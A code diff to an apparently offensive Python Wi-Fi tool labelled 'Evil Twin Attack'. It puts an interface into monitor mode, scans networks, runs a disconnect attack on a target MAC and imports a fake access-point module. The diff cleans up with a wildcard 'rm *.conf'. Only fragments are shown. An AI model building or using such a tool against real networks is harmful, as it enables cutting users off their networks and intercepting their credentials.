@@ -6,7 +6,9 @@ import time
 import logging
 import MonitorMode as mm
 import CreateConf as cc
+import FakeAP as fa
 import signal
+
 
 
 iface = ""
@@ -60,7 +62,7 @@ def DisConnectAttack(target_mac , gateway_mac, iface):
 def main():
     global iface ,ap_mac
     iface = input("please enter your interface: ")
-    iface = mm.Change_to_MonitorMode(iface)
+    iface = mm.change_to_MonitorMode(iface)
     print("********Evil Twin Attack*********")
     time.sleep(1)
     Wifi_scaning()
@@ -80,15 +82,15 @@ def main():
         disconnectThread.start()
         time.sleep(3)
         print("process keep going...")
+        #fa.start(iface)
         while True:
             try:
                 time.sleep(2) 
             except KeyboardInterrupt:
                 break
-        mm.Change_back(iface)
-        os.system("rm hostapd.conf")
-        os.system("rm dnsmasq.conf")
-
+        mm.change_back(iface)
+        os.system("rm *.conf")
+        
 
 if __name__ == "__main__":
     main()
